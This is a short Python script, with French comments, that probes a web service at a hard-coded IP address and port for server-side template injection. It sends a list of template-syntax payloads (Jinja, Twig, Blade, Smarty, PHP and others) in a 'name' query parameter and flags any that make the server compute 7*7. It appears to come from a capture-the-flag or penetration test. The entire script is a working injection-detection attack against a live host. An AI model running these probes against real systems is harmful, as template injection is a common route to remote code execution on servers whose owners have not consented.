import requests

url = 'http://51.159.16.22:8027/'

payloads = [
    # Délimiteurs alternatifs possibles
    '<< 7*7 >>',
    '[[ 7*7 ]]',
    '(( 7*7 ))',
    '<% 7*7 %>',
    '{{ 7*7 }}',
    '${ 7*7 }',
    '#{7*7}',
    # Twig avec délimiteurs Laravel/Blade
    '{!! 7*7 !!}',
    # Peut-être que le = est nécessaire
    '{{=7*7}}',
    # Smarty
    '{7*7}',
    '{math equation="7*7"}',
    # Plate
    '<?=7*7?>',
]

for p in payloads:
    r = requests.get(url, params={'name': p})
    if '49' in r.text:
        print(f'[FOUND] {repr(p)} → {r.text.strip()}')
    else:
        print(f'[FAIL]  {repr(p)} → {r.text.strip()}')